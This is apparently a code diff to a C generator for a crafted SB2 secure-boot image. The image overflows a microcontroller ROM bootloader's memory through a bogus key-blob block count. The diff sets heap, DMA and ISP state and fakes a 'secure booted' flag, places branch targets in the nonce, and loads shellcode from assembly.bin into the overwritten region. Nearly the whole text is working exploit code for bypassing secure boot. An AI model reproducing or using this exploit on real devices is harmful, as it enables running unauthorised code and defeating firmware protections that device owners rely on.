@@ -51,6 +51,17 @@ typedef struct version_t version_t;
         uint8_t m_padding1[4];        //!< Padding to round up to next cipher block.
     };
 
+
+#define EXTRA_BUFFER_START 0x140015a0
+
+// calculated from where the address after the buffer
+#define GLOBAL_ADDR(a) ( ((a) - EXTRA_BUFFER_START) / 4 )
+
+#define COPY_UNTIL 0x14005a50
+
+// This includes 6 for our header
+#define NUM_COPY_BLOCKS (6 + ((COPY_UNTIL - EXTRA_BUFFER_START) / 16))
+
 int main() {
 	struct sb2_header_t header = { 0 };
 
@@ -64,8 +75,8 @@ int main() {
 	header.nonce[0] = 0x00000e8f;
 	// Branch target!
 	// Remember to set the low bit for thumb mode
-	header.nonce[1] = 0x1301ae71;
-	//header.nonce[1] = 0x14005aa1;
+	//header.nonce[1] = 0x1301ae71;
+	header.nonce[1] = 0x14005a01;
 	// Branch to self (just for testing)
 	header.nonce[2] = 0xe7fee7fe;
 	// Extra 
@@ -94,9 +105,7 @@ int main() {
 	header.m_headerBlocks = 0x6;
 
 	// Our magic: set this to something unexpected!
-	//header.m_keyBlobBlock = 0x480;
-	header.m_keyBlobBlock = 0x3e;
-
+	header.m_keyBlobBlock = NUM_COPY_BLOCKS;
 
 	header.m_keyBlobBlockCount = 0x1;
 	header.m_maxSectionMacCount = 0x5;
@@ -111,14 +120,127 @@ int main() {
 
 	memset(extra_bytes, 0, sizeof(extra_bytes));
 
-	// this byte needs to be 0
-	extra_bytes[36] = 0x0;
-
 	// This is our target heap
-	extra_bytes[114] = 0x14001478;
+	extra_bytes[GLOBAL_ADDR(0x14001768)] = 0x14001478;
+
 	// Heap size
-	extra_bytes[115] = 0x4000;
+	extra_bytes[GLOBAL_ADDR(0x1400176c)] = 0x4000;
 	// afterwards is heap bytes -- we can't overwrite this!
+
+	// 0x14001770
+	extra_bytes[GLOBAL_ADDR(0x14001774)] = 0x1;
+	extra_bytes[GLOBAL_ADDR(0x14001778)] = 0x14003434;
+	extra_bytes[GLOBAL_ADDR(0x1400177c)] = 0x8;
+
+	// 0x14001780
+	extra_bytes[GLOBAL_ADDR(0x14001780)] = 0x14003434;
+	// I suspect this is key:
+	// Number of bytes left for ISP!
+	extra_bytes[GLOBAL_ADDR(0x14001784)] = 0x10e00;
+
+	// 0x14001790
+	// This looks like flash page size
+	extra_bytes[GLOBAL_ADDR(0x14001790)] = 0x200;
+	// Possibly the ISP command number
+	extra_bytes[GLOBAL_ADDR(0x14001794)] = 0x8;
+
+	// 0x140017a0
+	extra_bytes[GLOBAL_ADDR(0x140017a4)] = 0x130013a0;
+	extra_bytes[GLOBAL_ADDR(0x140017a8)] = 0x6b088563;
+
+	// Flexcomm state
+	// Flexcomm IRQ handler
+	extra_bytes[GLOBAL_ADDR(0x14002aac)] = 0x13019bef;
+
+	// Some kind of timer constant
+	extra_bytes[GLOBAL_ADDR(0x14003308)] = 0x30;
+
+	// ISP state?
+	extra_bytes[GLOBAL_ADDR(0x1400387c)] = 0x12;
+	extra_bytes[GLOBAL_ADDR(0x14003880)] = 0x12;
+	extra_bytes[GLOBAL_ADDR(0x14003884)] = 0x101;
+
+	// Marks us as secure booted
+	extra_bytes[GLOBAL_ADDR(0x1400389c)] = 0x5aa55aa5;
+
+	// DMA state
+	extra_bytes[GLOBAL_ADDR(0x14002ab8)] = 0x14002620;
+	extra_bytes[GLOBAL_ADDR(0x14002abc)] = 0x14002610;
+	extra_bytes[GLOBAL_ADDR(0x14002c28)] = 0x7;
+	extra_bytes[GLOBAL_ADDR(0x14002c34)] = 0xFF;
+	extra_bytes[GLOBAL_ADDR(0x14002c78)] = 0x5009f000;
+	extra_bytes[GLOBAL_ADDR(0x14002c7c)] = 0x14002630;
+	extra_bytes[GLOBAL_ADDR(0x14002cc0)] = 0x070effff;
+	extra_bytes[GLOBAL_ADDR(0x14002cc4)] = 0x070effff;
+
+	extra_bytes[GLOBAL_ADDR(0x14003d50)] = 0x01000106;
+
+
+	// misc ISP state
+	extra_bytes[GLOBAL_ADDR(0x14005028)] = 0x13013f7d;
+
+	extra_bytes[GLOBAL_ADDR(0x14005030)] = 0x14001774;
+
+
+	extra_bytes[GLOBAL_ADDR(0x14005040)] = 0x13002268;
+	extra_bytes[GLOBAL_ADDR(0x14005044)] = 0x14005024;
+	extra_bytes[GLOBAL_ADDR(0x14005048)] = 0x130011a8;
+	extra_bytes[GLOBAL_ADDR(0x1400504c)] = 0x13002190;
+
+	extra_bytes[GLOBAL_ADDR(0x14005050)] = 0x13002190;
+	extra_bytes[GLOBAL_ADDR(0x14005054)] = 0x140019b0;
+
+	extra_bytes[GLOBAL_ADDR(0x14005120)] = 0xc3c3000;
+	extra_bytes[GLOBAL_ADDR(0x14005124)] = 0;
+	extra_bytes[GLOBAL_ADDR(0x14005128)] = 0x9ddff;
+	extra_bytes[GLOBAL_ADDR(0x1400512c)] = 0x1;
+
+	extra_bytes[GLOBAL_ADDR(0x14005130)] = 0x0;
+	extra_bytes[GLOBAL_ADDR(0x14005134)] = 0x130018b0;
+	extra_bytes[GLOBAL_ADDR(0x14005138)] = 0x10000000;
+	extra_bytes[GLOBAL_ADDR(0x1400513c)] = 0x1009ddff;
+
+	extra_bytes[GLOBAL_ADDR(0x14005140)] = 0x101;
+	extra_bytes[GLOBAL_ADDR(0x14005144)] = 0x0;
+	extra_bytes[GLOBAL_ADDR(0x14005148)] = 0x130018b0;
+	extra_bytes[GLOBAL_ADDR(0x1400514c)] = 0x0009de00;
+
+	extra_bytes[GLOBAL_ADDR(0x14005150)] = 0x0009ffff;
+	extra_bytes[GLOBAL_ADDR(0x14005154)] = 0x0;
+	extra_bytes[GLOBAL_ADDR(0x14005158)] = 0x5;
+	extra_bytes[GLOBAL_ADDR(0x1400515c)] = 0x130018d0;
+
+	extra_bytes[GLOBAL_ADDR(0x14005160)] = 0x20000000;
+	extra_bytes[GLOBAL_ADDR(0x14005164)] = 0x2003ffff;
+	extra_bytes[GLOBAL_ADDR(0x14005168)] = 0x11;
+	extra_bytes[GLOBAL_ADDR(0x1400516c)] = 0x0;
+
+	extra_bytes[GLOBAL_ADDR(0x14005170)] = 0x13001ff4;
+	extra_bytes[GLOBAL_ADDR(0x14005174)] = 0x30000000;
+	extra_bytes[GLOBAL_ADDR(0x14005178)] = 0x3003ffff;
+	extra_bytes[GLOBAL_ADDR(0x1400517c)] = 0x00000111;
+
+	extra_bytes[GLOBAL_ADDR(0x14005180)] = 0x0;
+	extra_bytes[GLOBAL_ADDR(0x14005184)] = 0x13001ff4;
+	extra_bytes[GLOBAL_ADDR(0x14005188)] = 0x04000000;
+	extra_bytes[GLOBAL_ADDR(0x1400518c)] = 0x0403ffff;
+
+	extra_bytes[GLOBAL_ADDR(0x14005190)] = 0x00000011;
+	extra_bytes[GLOBAL_ADDR(0x14005194)] = 0x0;
+	extra_bytes[GLOBAL_ADDR(0x14005198)] = 0x13001ff4;
+	extra_bytes[GLOBAL_ADDR(0x1400519c)] = 0x14000000;
+
+	extra_bytes[GLOBAL_ADDR(0x140051a0)] = 0x1403ffff;
+	extra_bytes[GLOBAL_ADDR(0x140051a4)] = 0x111;
+	extra_bytes[GLOBAL_ADDR(0x140051a8)] = 0x0;
+	extra_bytes[GLOBAL_ADDR(0x140051ac)] = 0x13001ff4;
+
+	extra_bytes[GLOBAL_ADDR(0x140051ec)] = 0x14;
+
+	// Hmm our address...
+	extra_bytes[GLOBAL_ADDR(0x14005224)] = 0x50086000;
+
+
 
 	in_fd = open("assembly.bin", O_RDONLY);
 
@@ -131,16 +253,17 @@ int main() {
 	fstat(in_fd, &st);
 	size = st.st_size;
 
-	#define BASE 220
 
-	extra_bytes[BASE-1] = 0x55555555;
-	extra_bytes[BASE] = 0x12345678;
-	extra_bytes[BASE+1] = 0x12345678;
-	extra_bytes[BASE+2] = 0x12345678;
-	extra_bytes[BASE+3] = 0x12345678;
-	extra_bytes[BASE+4] = 0x55555555;
+	// Canary for testing
+	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-4)] = 0x44444444;
+	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-8)] = 0x44444444;
+	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-0xc)] = 0xbbbbbbbb;
+	//extra_bytes[GLOBAL_ADDR(COPY_UNTIL-0x10)] = 0x77777777;
 
-	ret = read(in_fd, &extra_bytes[0x1140], size);
+	extra_bytes[GLOBAL_ADDR(0x14005918)] = 0x34343434;
+
+
+	ret = read(in_fd, &extra_bytes[GLOBAL_ADDR(0x14005a00)], size);
 	
 	if (ret < 0) {
 		printf("failed to read");
